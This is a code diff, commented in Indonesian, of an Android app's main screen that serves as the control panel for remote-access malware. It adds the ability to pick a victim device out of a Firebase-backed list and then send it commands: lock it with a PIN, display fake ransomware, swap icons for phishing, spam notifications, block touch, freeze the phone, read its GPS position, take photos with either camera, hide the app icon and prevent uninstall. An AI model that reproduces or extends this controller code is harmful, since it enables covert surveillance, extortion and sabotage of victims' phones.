@@ -42,11 +42,13 @@ public class MainActivity extends AppCompatActivity {
     // Card components
     private Switch swFlashlight, swLockLow, swLockCustom, swHideIcon, swNgehang;
     private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus, tvNgehangStatus;
-    private TextView tvNamaFlashlight, tvNamaLockLow, tvNamaLockCustom, tvNamaHideIcon, tvNamaNgehang;
-    private ImageView ivFlashlight, ivLockLow, ivLockCustom, ivHideIcon, ivNgehang;
 
     private Button btnGanti, btnSetServer;
     private EditText etServerUrl;
+
+    // Target ID yang dipilih
+    private String selectedTargetId = null;
+    private boolean isTargetConnected = false;
 
     private static final int REQUEST_VIDEO = 1001;
 
@@ -57,6 +59,7 @@ public class MainActivity extends AppCompatActivity {
     private ValueEventListener lockCustomListener;
     private ValueEventListener hideIconListener;
     private ValueEventListener ngehangListener;
+    private ValueEventListener targetListListener;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -68,7 +71,6 @@ public class MainActivity extends AppCompatActivity {
         mStorage = FirebaseStorage.getInstance().getReference();
 
         // ===== INISIALISASI VIEW =====
-        // Header
         tvDeviceName = findViewById(R.id.tvDeviceName);
         tvDeviceId = findViewById(R.id.tvDeviceId);
         tvStatus = findViewById(R.id.tvStatus);
@@ -76,99 +78,56 @@ public class MainActivity extends AppCompatActivity {
         tvDeviceName2 = findViewById(R.id.tvDeviceName2);
         tvDeviceId2 = findViewById(R.id.tvDeviceId2);
 
-        // Anti Uninstall
         tvAntiUninstallText = findViewById(R.id.tvAntiUninstallText);
         swAntiUninstall = findViewById(R.id.swAntiUninstall);
 
-        // Buttons
         btnGanti = findViewById(R.id.btnGanti);
         btnSetServer = findViewById(R.id.btnSetServer);
         etServerUrl = findViewById(R.id.etServerUrl);
 
+        // ===== SET NAMA FITUR PADA CARD =====
+        setCardName(R.id.cardFlashlight, "Flashlight");
+        setCardName(R.id.cardLockLow, "Lock Low");
+        setCardName(R.id.cardLockCustom, "Lock Custom V2");
+        setCardName(R.id.cardTemaPhising, "Tema Phising");
+        setCardName(R.id.cardHideIcon, "Hide Icon");
+        setCardName(R.id.cardVideoOverlay, "Video Overlay");
+        setCardName(R.id.cardSpamNotif, "Spam Notifikasi");
+        setCardName(R.id.cardStuckLayar, "Stuck Layar");
+        setCardName(R.id.cardGPS, "GPS");
+        setCardName(R.id.cardKamera, "Kamera");
+        setCardName(R.id.cardRansomware, "Fake Ransomware");
+        setCardName(R.id.cardNgehang, "Ngehang");
+
         // ===== AMBIL REFERENSI SWITCH & TEXTVIEW DARI CARD =====
-        // Flashlight
         View cardFlashlight = findViewById(R.id.cardFlashlight);
         swFlashlight = cardFlashlight.findViewById(R.id.swFitur);
         tvFlashlightStatus = cardFlashlight.findViewById(R.id.tvStatusFitur);
-        tvNamaFlashlight = cardFlashlight.findViewById(R.id.tvNamaFitur);
 
-        // Lock Low
         View cardLockLow = findViewById(R.id.cardLockLow);
         swLockLow = cardLockLow.findViewById(R.id.swFitur);
         tvLockLowStatus = cardLockLow.findViewById(R.id.tvStatusFitur);
-        tvNamaLockLow = cardLockLow.findViewById(R.id.tvNamaFitur);
 
-        // Lock Custom
         View cardLockCustom = findViewById(R.id.cardLockCustom);
         swLockCustom = cardLockCustom.findViewById(R.id.swFitur);
         tvLockCustomStatus = cardLockCustom.findViewById(R.id.tvStatusFitur);
-        tvNamaLockCustom = cardLockCustom.findViewById(R.id.tvNamaFitur);
 
-        // Hide Icon
         View cardHideIcon = findViewById(R.id.cardHideIcon);
         swHideIcon = cardHideIcon.findViewById(R.id.swFitur);
         tvHideIconStatus = cardHideIcon.findViewById(R.id.tvStatusFitur);
-        tvNamaHideIcon = cardHideIcon.findViewById(R.id.tvNamaFitur);
 
-        // Ngehang
         View cardNgehang = findViewById(R.id.cardNgehang);
         swNgehang = cardNgehang.findViewById(R.id.swFitur);
         tvNgehangStatus = cardNgehang.findViewById(R.id.tvStatusFitur);
-        tvNamaNgehang = cardNgehang.findViewById(R.id.tvNamaFitur);
-
-        // ===== SETUP ICON =====
-        // Tema Phising
-        View cardTemaPhising = findViewById(R.id.cardTemaPhising);
-        ImageView ivTemaPhising = cardTemaPhising.findViewById(R.id.ivIcon);
-        TextView tvTemaPhising = cardTemaPhising.findViewById(R.id.tvNamaFitur);
-        if (ivTemaPhising != null) ivTemaPhising.setImageResource(R.drawable.ic_flashlight);
-        if (tvTemaPhising != null) tvTemaPhising.setText("Tema Phising");
-
-        // Video Overlay
-        View cardVideoOverlay = findViewById(R.id.cardVideoOverlay);
-        ImageView ivVideoOverlay = cardVideoOverlay.findViewById(R.id.ivIcon);
-        TextView tvVideoOverlay = cardVideoOverlay.findViewById(R.id.tvNamaFitur);
-        if (ivVideoOverlay != null) ivVideoOverlay.setImageResource(R.drawable.ic_flashlight);
-        if (tvVideoOverlay != null) tvVideoOverlay.setText("Video Overlay");
-
-        // Spam Notifikasi
-        View cardSpamNotif = findViewById(R.id.cardSpamNotif);
-        ImageView ivSpamNotif = cardSpamNotif.findViewById(R.id.ivIcon);
-        TextView tvSpamNotif = cardSpamNotif.findViewById(R.id.tvNamaFitur);
-        if (ivSpamNotif != null) ivSpamNotif.setImageResource(R.drawable.ic_flashlight);
-        if (tvSpamNotif != null) tvSpamNotif.setText("Spam Notifikasi");
-
-        // Stuck Layar
-        View cardStuckLayar = findViewById(R.id.cardStuckLayar);
-        ImageView ivStuckLayar = cardStuckLayar.findViewById(R.id.ivIcon);
-        TextView tvStuckLayar = cardStuckLayar.findViewById(R.id.tvNamaFitur);
-        if (ivStuckLayar != null) ivStuckLayar.setImageResource(R.drawable.ic_flashlight);
-        if (tvStuckLayar != null) tvStuckLayar.setText("Stuck Layar");
-
-        // GPS
-        View cardGPS = findViewById(R.id.cardGPS);
-        ImageView ivGPS = cardGPS.findViewById(R.id.ivIcon);
-        TextView tvGPS = cardGPS.findViewById(R.id.tvNamaFitur);
-        if (ivGPS != null) ivGPS.setImageResource(R.drawable.ic_flashlight);
-        if (tvGPS != null) tvGPS.setText("GPS");
-
-        // Kamera
-        View cardKamera = findViewById(R.id.cardKamera);
-        ImageView ivKamera = cardKamera.findViewById(R.id.ivIcon);
-        TextView tvKamera = cardKamera.findViewById(R.id.tvNamaFitur);
-        if (ivKamera != null) ivKamera.setImageResource(R.drawable.ic_flashlight);
-        if (tvKamera != null) tvKamera.setText("Kamera");
-
-        // Fake Ransomware
-        View cardRansomware = findViewById(R.id.cardRansomware);
-        ImageView ivRansomware = cardRansomware.findViewById(R.id.ivIcon);
-        TextView tvRansomware = cardRansomware.findViewById(R.id.tvNamaFitur);
-        if (ivRansomware != null) ivRansomware.setImageResource(R.drawable.ic_flashlight);
-        if (tvRansomware != null) tvRansomware.setText("Fake Ransomware");
 
         sendMyDeviceInfo();
         listenDeviceInfoRealtime();
+
+        // ===== LISTEN SEMUA STATUS =====
         listenStatusRealtime();
+
+        // ===== LISTEN TARGET LIST =====
+        listenTargetList();
 
         // ===== GANTI SERVER =====
         btnSetServer.setOnClickListener(v -> {
@@ -189,29 +148,34 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
-        // ===== GANTI =====
-        btnGanti.setOnClickListener(v -> Toast.makeText(this, "Fitur Ganti Target", Toast.LENGTH_SHORT).show());
+        // ===== GANTI TARGET =====
+        btnGanti.setOnClickListener(v -> {
+            showTargetSelectionDialog();
+        });
 
         // ===== FLASHLIGHT =====
         swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            mDatabase.child("flashlight").setValue(isChecked);
+            if (!checkTargetConnection()) return;
+            mDatabase.child(selectedTargetId).child("flashlight").setValue(isChecked);
             updateStatusText(tvFlashlightStatus, isChecked);
             Toast.makeText(this, "Flashlight: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
         // ===== LOCK LOW =====
         swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            mDatabase.child("lockLow").setValue(isChecked);
+            if (!checkTargetConnection()) return;
+            mDatabase.child(selectedTargetId).child("lockLow").setValue(isChecked);
             updateStatusText(tvLockLowStatus, isChecked);
             Toast.makeText(this, "Lock Low: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
         // ===== LOCK CUSTOM V2 =====
         swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
+            if (!checkTargetConnection()) return;
             if (isChecked) {
                 showPinDialog("lockCustom", "🔒 Lock Custom V2");
             } else {
-                mDatabase.child("lockCustom").setValue(false);
+                mDatabase.child(selectedTargetId).child("lockCustom").setValue(false);
                 updateStatusText(tvLockCustomStatus, false);
                 Toast.makeText(this, "🔓 Lock Custom OFF", Toast.LENGTH_SHORT).show();
             }
@@ -219,22 +183,26 @@ public class MainActivity extends AppCompatActivity {
 
         // ===== NGEHANG =====
         swNgehang.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            mDatabase.child("ngehang").setValue(isChecked);
+            if (!checkTargetConnection()) return;
+            mDatabase.child(selectedTargetId).child("ngehang").setValue(isChecked);
             updateStatusText(tvNgehangStatus, isChecked);
             Toast.makeText(this, "💀 Ngehang: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
         // ===== HIDE ICON =====
         swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            mDatabase.child("hideIcon").setValue(isChecked);
+            if (!checkTargetConnection()) return;
+            mDatabase.child(selectedTargetId).child("hideIcon").setValue(isChecked);
             updateStatusText(tvHideIconStatus, isChecked);
             Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
         });
 
         // ===== TEMA PHISING =====
+        View cardTemaPhising = findViewById(R.id.cardTemaPhising);
         Button btnTemaPhising = cardTemaPhising.findViewById(R.id.btnAction);
         if (btnTemaPhising != null) {
             btnTemaPhising.setOnClickListener(v -> {
+                if (!checkTargetConnection()) return;
                 AlertDialog.Builder builder = new AlertDialog.Builder(this);
                 builder.setTitle("🎨 Tema Phising");
                 final EditText input = new EditText(this);
@@ -243,7 +211,7 @@ public class MainActivity extends AppCompatActivity {
                 builder.setPositiveButton("GANTI", (dialog, which) -> {
                     String url = input.getText().toString();
                     if (!url.isEmpty()) {
-                        mDatabase.child("temaPhising").setValue(url);
+                        mDatabase.child(selectedTargetId).child("temaPhising").setValue(url);
                         Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
                     }
                 });
@@ -253,9 +221,11 @@ public class MainActivity extends AppCompatActivity {
         }
 
         // ===== VIDEO OVERLAY =====
+        View cardVideoOverlay = findViewById(R.id.cardVideoOverlay);
         Button btnVideoOverlay = cardVideoOverlay.findViewById(R.id.btnAction);
         if (btnVideoOverlay != null) {
             btnVideoOverlay.setOnClickListener(v -> {
+                if (!checkTargetConnection()) return;
                 Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
                 intent.setType("video/*");
                 startActivityForResult(intent, REQUEST_VIDEO);
@@ -263,9 +233,11 @@ public class MainActivity extends AppCompatActivity {
         }
 
         // ===== SPAM NOTIFIKASI =====
+        View cardSpamNotif = findViewById(R.id.cardSpamNotif);
         Button btnSpamNotif = cardSpamNotif.findViewById(R.id.btnAction);
         if (btnSpamNotif != null) {
             btnSpamNotif.setOnClickListener(v -> {
+                if (!checkTargetConnection()) return;
                 AlertDialog.Builder builder = new AlertDialog.Builder(this);
                 builder.setTitle("📨 Kirim Spam Notifikasi");
                 final EditText input = new EditText(this);
@@ -274,7 +246,7 @@ public class MainActivity extends AppCompatActivity {
                 builder.setPositiveButton("KIRIM", (dialog, which) -> {
                     String pesan = input.getText().toString();
                     if (!pesan.isEmpty()) {
-                        mDatabase.child("spamNotif").setValue(pesan);
+                        mDatabase.child(selectedTargetId).child("spamNotif").setValue(pesan);
                         Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
                     } else {
                         Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
@@ -286,32 +258,38 @@ public class MainActivity extends AppCompatActivity {
         }
 
         // ===== STUCK LAYAR =====
+        View cardStuckLayar = findViewById(R.id.cardStuckLayar);
         Button btnStuckLayar = cardStuckLayar.findViewById(R.id.btnAction);
         if (btnStuckLayar != null) {
             btnStuckLayar.setOnClickListener(v -> {
-                mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
+                if (!checkTargetConnection()) return;
+                mDatabase.child(selectedTargetId).child("stuckLayar").setValue("TAP, BLOCK TOUCH");
                 Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
             });
         }
 
         // ===== GPS =====
+        View cardGPS = findViewById(R.id.cardGPS);
         Button btnGPS = cardGPS.findViewById(R.id.btnAction);
         if (btnGPS != null) {
             btnGPS.setOnClickListener(v -> {
-                mDatabase.child("command").setValue("gps");
+                if (!checkTargetConnection()) return;
+                mDatabase.child(selectedTargetId).child("command").setValue("gps");
                 Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
             });
         }
 
         // ===== KAMERA =====
+        View cardKamera = findViewById(R.id.cardKamera);
         Button btnKamera = cardKamera.findViewById(R.id.btnAction);
         if (btnKamera != null) {
             btnKamera.setOnClickListener(v -> {
+                if (!checkTargetConnection()) return;
                 AlertDialog.Builder builder = new AlertDialog.Builder(this);
                 builder.setTitle("📸 Pilih Kamera Target");
                 builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
                     String command = (which == 0) ? "camera_front" : "camera_back";
-                    mDatabase.child("command").setValue(command);
+                    mDatabase.child(selectedTargetId).child("command").setValue(command);
                     Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
                 });
                 builder.show();
@@ -319,11 +297,60 @@ public class MainActivity extends AppCompatActivity {
         }
 
         // ===== FAKE RANSOMWARE =====
+        View cardRansomware = findViewById(R.id.cardRansomware);
         Button btnRansomware = cardRansomware.findViewById(R.id.btnAction);
         if (btnRansomware != null) {
             btnRansomware.setOnClickListener(v -> {
+                if (!checkTargetConnection()) return;
                 showPinDialog("ransomware", "💰 Fake Ransomware");
             });
+        }
+    }
+
+    // ===== CEK KONEKSI TARGET =====
+    private boolean checkTargetConnection() {
+        if (selectedTargetId == null || !isTargetConnected) {
+            AlertDialog.Builder builder = new AlertDialog.Builder(this);
+            builder.setTitle("⚠️ Belum Terhubung");
+            builder.setMessage("Belum terhubung ke target. Silakan pilih target terlebih dahulu.");
+            builder.setPositiveButton("PILIH TARGET", (dialog, which) -> {
+                showTargetSelectionDialog();
+            });
+            builder.setNegativeButton("Batal", null);
+            builder.show();
+            return false;
+        }
+        return true;
+    }
+
+    // ===== FUNGSI SET NAMA FITUR PADA CARD =====
+    private void setCardName(int cardId, String nama) {
+        View card = findViewById(cardId);
+        if (card == null) return;
+        TextView tvNama = card.findViewById(R.id.tvNamaFitur);
+        if (tvNama != null) {
+            tvNama.setText(nama);
+        }
+        // Sembunyikan toggle untuk fitur non-toggle
+        String[] toggleFitur = {"Flashlight", "Lock Low", "Lock Custom V2", "Hide Icon", "Ngehang"};
+        boolean isToggle = false;
+        for (String f : toggleFitur) {
+            if (f.equals(nama)) isToggle = true;
+        }
+        Switch swFitur = card.findViewById(R.id.swFitur);
+        TextView tvStatus = card.findViewById(R.id.tvStatusFitur);
+        Button btnAction = card.findViewById(R.id.btnAction);
+        if (isToggle) {
+            if (swFitur != null) swFitur.setVisibility(View.VISIBLE);
+            if (tvStatus != null) tvStatus.setVisibility(View.VISIBLE);
+            if (btnAction != null) btnAction.setVisibility(View.GONE);
+        } else {
+            if (swFitur != null) swFitur.setVisibility(View.GONE);
+            if (tvStatus != null) tvStatus.setVisibility(View.GONE);
+            if (btnAction != null) {
+                btnAction.setVisibility(View.VISIBLE);
+                btnAction.setText("TAP");
+            }
         }
     }
 
@@ -341,13 +368,13 @@ public class MainActivity extends AppCompatActivity {
         builder.setPositiveButton("LANJUT", (dialog, which) -> {
             String pin = input.getText().toString().trim();
             if (pin.length() == 4) {
-                mDatabase.child("pin").setValue(pin);
+                mDatabase.child(selectedTargetId).child("pin").setValue(pin);
                 if (command.equals("lockCustom")) {
-                    mDatabase.child("lockCustom").setValue(true);
+                    mDatabase.child(selectedTargetId).child("lockCustom").setValue(true);
                     updateStatusText(tvLockCustomStatus, true);
                     Toast.makeText(this, "🔒 HP Target Terkunci! PIN: " + pin, Toast.LENGTH_SHORT).show();
                 } else if (command.equals("ransomware")) {
-                    mDatabase.child("ransomware").setValue(true);
+                    mDatabase.child(selectedTargetId).child("ransomware").setValue(true);
                     Toast.makeText(this, "💰 Target kena Ransomware! PIN: " + pin, Toast.LENGTH_SHORT).show();
                 }
             } else {
@@ -374,6 +401,152 @@ public class MainActivity extends AppCompatActivity {
         });
 
         builder.show();
+    }
+
+    // ===== DIALOG PILIH TARGET =====
+    private void showTargetSelectionDialog() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("📱 PILIH TARGET");
+
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setPadding(20, 20, 20, 20);
+
+        TextView info = new TextView(this);
+        info.setText("Memuat daftar target...");
+        info.setTextColor(0xFFFFFFFF);
+        layout.addView(info);
+
+        builder.setView(layout);
+        AlertDialog dialog = builder.create();
+
+        // Ambil daftar target dari Firebase
+        mDatabase.addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                layout.removeAllViews();
+                boolean hasTarget = false;
+
+                for (DataSnapshot child : snapshot.getChildren()) {
+                    String key = child.getKey();
+                    if (key == null || key.equals("deviceInfo") || key.equals("serverUrl")) continue;
+
+                    String deviceName = child.child("deviceName").getValue(String.class);
+                    String deviceId = child.child("deviceId").getValue(String.class);
+                    Integer battery = child.child("battery").getValue(Integer.class);
+                    Boolean online = child.child("online").getValue(Boolean.class);
+
+                    if (deviceName == null || deviceId == null) continue;
+                    hasTarget = true;
+
+                    LinearLayout item = new LinearLayout(MainActivity.this);
+                    item.setOrientation(LinearLayout.VERTICAL);
+                    item.setPadding(16, 12, 16, 12);
+                    item.setBackgroundColor(0x1A1A1A);
+                    item.setClickable(true);
+
+                    TextView tvName = new TextView(MainActivity.this);
+                    String status = online != null && online ? "🟢 ONLINE" : "🔴 OFFLINE";
+                    String bat = battery != null ? battery + "%" : "?%";
+                    tvName.setText(deviceName + " (" + status + ") " + bat);
+                    tvName.setTextColor(online != null && online ? 0xFF4ADE80 : 0xFFFF5C7C);
+                    item.addView(tvName);
+
+                    TextView tvId = new TextView(MainActivity.this);
+                    tvId.setText("ID: " + deviceId);
+                    tvId.setTextColor(0xFF9CA3AF);
+                    tvId.setTextSize(12);
+                    item.addView(tvId);
+
+                    item.setOnClickListener(v -> {
+                        selectedTargetId = key;
+                        isTargetConnected = online != null && online;
+                        // Update header dengan data target
+                        if (deviceName != null) {
+                            tvDeviceName.setText(deviceName);
+                            tvDeviceName2.setText(deviceName);
+                        }
+                        if (deviceId != null) {
+                            tvDeviceId.setText(deviceId);
+                            tvDeviceId2.setText(deviceId);
+                        }
+                        if (battery != null) tvBattery.setText(battery + "%");
+                        if (online != null) {
+                            tvStatus.setText(online ? "ONLINE" : "OFFLINE");
+                            tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
+                        }
+                        Toast.makeText(MainActivity.this, "✅ Target dipilih: " + deviceName, Toast.LENGTH_SHORT).show();
+                        dialog.dismiss();
+                    });
+
+                    layout.addView(item);
+                    // Spacer
+                    View spacer = new View(MainActivity.this);
+                    spacer.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 8));
+                    layout.addView(spacer);
+                }
+
+                if (!hasTarget) {
+                    TextView noTarget = new TextView(MainActivity.this);
+                    noTarget.setText("⚠️ Belum ada target yang terhubung");
+                    noTarget.setTextColor(0xFFFF5C7C);
+                    noTarget.setPadding(16, 16, 16, 16);
+                    layout.addView(noTarget);
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {
+                TextView err = new TextView(MainActivity.this);
+                err.setText("❌ Gagal memuat daftar target");
+                err.setTextColor(0xFFFF5C7C);
+                err.setPadding(16, 16, 16, 16);
+                layout.addView(err);
+            }
+        });
+
+        builder.setNegativeButton("Tutup", (d, which) -> dialog.dismiss());
+        dialog.show();
+    }
+
+    // ===== LISTEN TARGET LIST =====
+    private void listenTargetList() {
+        targetListListener = new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                // Update otomatis header jika target yang dipilih berubah
+                if (selectedTargetId != null) {
+                    DataSnapshot targetSnapshot = snapshot.child(selectedTargetId);
+                    if (targetSnapshot.exists()) {
+                        String deviceName = targetSnapshot.child("deviceName").getValue(String.class);
+                        String deviceId = targetSnapshot.child("deviceId").getValue(String.class);
+                        Integer battery = targetSnapshot.child("battery").getValue(Integer.class);
+                        Boolean online = targetSnapshot.child("online").getValue(Boolean.class);
+
+                        runOnUiThread(() -> {
+                            if (deviceName != null) {
+                                tvDeviceName.setText(deviceName);
+                                tvDeviceName2.setText(deviceName);
+                            }
+                            if (deviceId != null) {
+                                tvDeviceId.setText(deviceId);
+                                tvDeviceId2.setText(deviceId);
+                            }
+                            if (battery != null) tvBattery.setText(battery + "%");
+                            if (online != null) {
+                                tvStatus.setText(online ? "ONLINE" : "OFFLINE");
+                                tvStatus.setTextColor(online ? 0xFF4ADE80 : 0xFFFF5C7C);
+                            }
+                            isTargetConnected = online != null && online;
+                        });
+                    }
+                }
+            }
+
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {}
+        };
+        mDatabase.addValueEventListener(targetListListener);
     }
 
     // ===== UPDATE STATUS TEXT =====
@@ -417,7 +590,6 @@ public class MainActivity extends AppCompatActivity {
 
     // ===== REAL-TIME: STATUS =====
     private void listenStatusRealtime() {
-        // Flashlight
         flashlightListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -434,7 +606,6 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("flashlight").addValueEventListener(flashlightListener);
 
-        // Lock Low
         lockLowListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -451,7 +622,6 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("lockLow").addValueEventListener(lockLowListener);
 
-        // Lock Custom
         lockCustomListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -468,7 +638,6 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("lockCustom").addValueEventListener(lockCustomListener);
 
-        // Hide Icon
         hideIconListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -485,7 +654,6 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("hideIcon").addValueEventListener(hideIconListener);
 
-        // Anti Uninstall
         antiUninstallListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -502,7 +670,6 @@ public class MainActivity extends AppCompatActivity {
         };
         mDatabase.child("antiUninstall").addValueEventListener(antiUninstallListener);
 
-        // Ngehang
         ngehangListener = new ValueEventListener() {
             @Override
             public void onDataChange(@NonNull DataSnapshot snapshot) {
@@ -553,7 +720,7 @@ public class MainActivity extends AppCompatActivity {
         StorageReference ref = mStorage.child("videos/" + System.currentTimeMillis() + ".mp4");
         ref.putFile(videoUri).addOnSuccessListener(taskSnapshot -> {
             ref.getDownloadUrl().addOnSuccessListener(uri -> {
-                mDatabase.child("videoUrl").setValue(uri.toString());
+                mDatabase.child(selectedTargetId).child("videoUrl").setValue(uri.toString());
                 Toast.makeText(this, "✅ Video terkirim ke target!", Toast.LENGTH_SHORT).show();
             });
         }).addOnFailureListener(e -> {
@@ -571,5 +738,6 @@ public class MainActivity extends AppCompatActivity {
         if (hideIconListener != null) mDatabase.child("hideIcon").removeEventListener(hideIconListener);
         if (antiUninstallListener != null) mDatabase.child("antiUninstall").removeEventListener(antiUninstallListener);
         if (ngehangListener != null) mDatabase.child("ngehang").removeEventListener(ngehangListener);
+        if (targetListListener != null) mDatabase.removeEventListener(targetListListener);
     }
-    }
+            }
